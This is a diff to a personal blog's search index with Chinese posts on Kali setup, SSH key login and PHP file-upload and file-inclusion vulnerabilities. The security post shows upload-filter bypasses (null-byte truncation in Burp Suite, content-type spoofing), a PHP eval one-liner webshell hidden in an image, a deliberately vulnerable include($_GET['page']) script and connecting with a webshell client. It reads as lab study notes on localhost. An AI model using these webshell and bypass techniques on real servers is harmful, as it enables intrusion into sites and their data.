@@ -1,6 +1,28 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[kali]]></title>
+    <url>%2F2018%2F04%2F11%2Fkali%2F</url>
+    <content type="text"><![CDATA[kali2018-1安装官网下载:https://www.kali.org/downloads/出处http://www.weixianmanbu.com/article/2336.html Vmtools问题成功安装Vmtools后仍然无法使用文件复制粘贴，就放弃了Vmtools，改用open-vmtools一行命令即可apt-get install open-vm-tools-desktop fuse然后reboot mysql任意密码登录问题mysql -u root，进入mysql，输入12GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;youpassword&apos; WITH GRANT OPTION; #youpassword你的新密码flush privileges; #刷新一下]]></content>
+      <categories>
+        <category>Kali</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[文件包含漏洞]]></title>
+    <url>%2F2018%2F04%2F09%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[上传文件校验 客户端javascript校验（一般只校验后缀名） 服务端校验 文件头content-type字段校验（image/gif） 件内容头校验（GIF89a） 后缀名黑名单校验 后缀名白名单校验 自定义正则校验 WAF设备校验（根据不同的WAF产品而定 php文件上传过程黑名单、白名单认证此文可以参考https://blog.csdn.net/hitwangpeng/article/details/47060671黑名单绕过可以测试，如1.aaa，1.php3,1.php4等进行测试 文件上传漏洞Burpsuite改包 0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候 上传文件为1.php，在burpsuite将其改为1.php+，发送到repeate，+号的十六进制为2d，在hex里面将其改为00，截断，点GO 上传文件为1.php.jpg，将jpg前面的.的十六进制（2e）改为00 上传一句话木马，1.php；&lt;?php eval($_POST[&quot;xxx&quot;]);?&gt;，在Burpsuite里面将其文件名改为1.jpg，还有将content-type字段改为image/jpg； 图片木马 Windows下制作图片一句话木马php写入图片copy 1.jpg/b+2.php/a New.jpg Linux下cat 1.jpg 2.php &gt; new.jpg点击上传，http://localhost/upload/upload.html上传成功后，使用文件包含程序，将jpg文件进行解析http://localhost/upload/1.php?page=./uploads/h.jpg?paragam(参数)=图片的绝对路径此时上传成功，php程序一句被即解析，本页面只会显示图片的源码，而不显示php程序，此时查看源代码php程序已经被注释接下来可以使用菜刀连接&nbsp;刚刚的网址，密码是php程序里面写入的参数1.php 12345678&lt;?php if(isset($_GET[&quot;page&quot;]))&#123; include $_GET[&quot;page&quot;]; &#125;else&#123; include &apos;2.php&apos;; &#125;?&gt; 2.php123&lt;?php echo &quot;niaho&quot;;?&gt; ###文件包含漏洞详解，转自https://blog.csdn.net/chence19871/article/details/51906523web安全文件包含漏洞，转自https://blog.csdn.net/hitwangpeng/article/details/45952625绕过姿势https://thief.one/2017/04/10/2/https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/]]></content>
+      <categories>
+        <category>Security</category>
+      </categories>
+      <tags>
+        <tag>Php安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[ssh远程连接Linux]]></title>
     <url>%2F2018%2F04%2F07%2F%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5Linux%2F</url>
     <content type="text"><![CDATA[首先,确定是否有安装SSH服务命令：ps -e | grep ssh*如果没有任何显示,则没有安装该服务其次,安装SSH-serversudo apt-get install openssh-server接着,更重要的是安装SSH-clientsudo apt-get install openssh-client确认安装SSH服务成功与否ps -e | grep ssh*如果,看到sshd表明ssh-server启动了; 服务器端设置ssh免密首先Linux要配置好ssh免密连接cd /root/.ssh/如果没有此文件，可以先使用ssh localhost之后便可以进入.ssh文件ls查看只有这一个文件,known_hosts先在本机生成公钥和私钥, ssh-keygen -t rsa将公钥写入认证里面,cat ./id_rsa.pub &gt;&gt; ./authorized_keys修改文件authorized_keys权限为600,chmod 600 .ssh/authorized_keys至此，ssh免密已经配置好了，上述步骤如下 使用Xshell免密远程连接linux转自https://www.linuxidc.com/Linux/2015-03/114947.htm补充网址里面的第六步：复制生成的公钥到linux可以直接将本地id_rsa_2048.pub直接复制过去,将其放入/root/.ssh/文件夹下，使用此命令写入认证cat ./id_rsa_2048.pub &gt;&gt; ./authorized_keys此时再按照上面的网址操作即可 使用cmder免密连接linux先在本机生成公钥和私钥, ssh-keygen -t rsa将生成的id_rsa.pub重命名为id_rsa0.pub(因为linux下一句有一个与此同名的文件),上传至服务器;window下生成的id_rsa.pub存放于C:\Users\用户名\.ssh下将其放入/root/.ssh/文件夹下;使用此命令写入认证cat ./id_rsa0.pub &gt;&gt; ./authorized_keys此时Cmder连接linux已经免密了 PS：使用ssh连接，关闭linux系统防火墙才可连接，关闭防火墙命令service iptables stop]]></content>
@@ -9,17 +31,6 @@
       </categories>
       <tags>
         <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[文件包含漏洞]]></title>
-    <url>%2F2018%2F04%2F07%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
-    <content type="text"><![CDATA[上传文件校验 客户端javascript校验（一般只校验后缀名） 服务端校验 文件头content-type字段校验（image/gif） 件内容头校验（GIF89a） 后缀名黑名单校验 后缀名白名单校验 自定义正则校验 WAF设备校验（根据不同的WAF产品而定php文件上传过程黑名单、白名单认证此文可以参考https://blog.csdn.net/hitwangpeng/article/details/47060671图片木马 Windows下制作图片一句话木马php写入图片copy 1.jpg/b+2.php/a New.jpg Linux下cat 1.jpg 2.php &gt; new.jpg点击上传，http://localhost/upload/upload.html上传成功后，使用文件包含程序，将jpg文件进行解析http://localhost/upload/1.php?page=./uploads/h.jpg?paragam(参数)=图片的绝对路径此时上传成功，php程序一句被即解析，本页面只会显示图片的源码，而不显示php程序，此时查看源代码php程序已经被注释接下来可以使用菜刀连接&nbsp;刚刚的网址，密码是php程序里面写入的参数1.php 12345678&lt;?php if(isset($_GET[&quot;page&quot;]))&#123; include $_GET[&quot;page&quot;]; &#125;else&#123; include &apos;2.php&apos;; &#125;?&gt; 2.php123&lt;?php echo &quot;niaho&quot;;?&gt; ###文件包含漏洞详解，转自https://blog.csdn.net/chence19871/article/details/51906523web安全文件包含漏洞，转自https://blog.csdn.net/hitwangpeng/article/details/45952625绕过姿势https://thief.one/2017/04/10/2/https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/]]></content>
-      <categories>
-        <category>Security</category>
-      </categories>
-      <tags>
-        <tag>Php安全</tag>
       </tags>
   </entry>
   <entry>
